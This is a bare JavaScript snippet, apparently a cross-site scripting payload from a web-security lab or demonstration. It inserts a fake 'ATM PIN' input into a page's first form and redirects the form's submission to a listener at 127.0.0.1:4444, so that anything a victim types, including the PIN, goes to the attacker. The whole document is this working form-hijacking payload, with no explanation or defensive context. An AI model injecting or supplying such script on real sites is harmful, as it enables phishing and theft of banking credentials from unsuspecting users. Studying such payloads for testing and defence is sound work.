<script>
    var input = document.createElement("input");
    input.setAttribute("type","text");
    input.setAttribute("class","input-block-level");
    input.setAttribute("placeholder","ATM PIN");
    input.setAttribute("name","atmpin");

    var previous = document.forms[0].elements[0];
    document.forms[0].insertBefore(input, previous);
    document.forms[0].action = "http://127.0.0.1:4444/";
</script>
